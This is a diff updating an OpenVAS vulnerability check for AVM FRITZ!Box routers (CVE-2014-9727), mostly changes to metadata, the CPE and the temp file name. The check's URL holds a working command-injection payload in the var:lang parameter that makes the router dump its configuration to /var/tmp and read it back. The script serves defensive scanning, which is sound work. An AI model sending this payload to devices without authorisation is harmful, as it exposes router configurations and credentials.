@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_avm_fritz_box_02_14_remote.nasl 5072 2017-01-24 10:16:40Z cfi $
+# $Id: gb_avm_fritz_box_02_14_remote.nasl 11413 2018-09-16 11:07:26Z cfischer $
 #
 # Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)
 #
@@ -25,18 +25,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = 'cpe:/a:avm:fritzbox';
+CPE = "cpe:/o:avm:fritz%21_os";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103912");
-  script_version("$Revision: 5072 $");
+  script_version("$Revision: 11413 $");
   script_bugtraq_id(74927, 65520);
   script_cve_id("CVE-2014-9727");
   script_name("Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-01-24 11:16:40 +0100 (Tue, 24 Jan 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-16 13:07:26 +0200 (Sun, 16 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-03-10 11:07:20 +0100 (Mon, 10 Mar 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -69,12 +69,14 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
-if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection NVT.
+if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
-file = 'OpenVAS_' + rand();
-url = "/cgi-bin/webcm?var:lang=%26allcfgconv%20-C%20ar7%20-c%20-o%20/var/tmp/" + file + "%26%26%20cat%20/var/tmp/" + file;
+file = get_vt_string() + "_" + rand();
+url = dir + "/cgi-bin/webcm?var:lang=%26allcfgconv%20-C%20ar7%20-c%20-o%20/var/tmp/" + file + "%26%26%20cat%20/var/tmp/" + file;
 
 req = http_get( item:url, port:port );
 buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
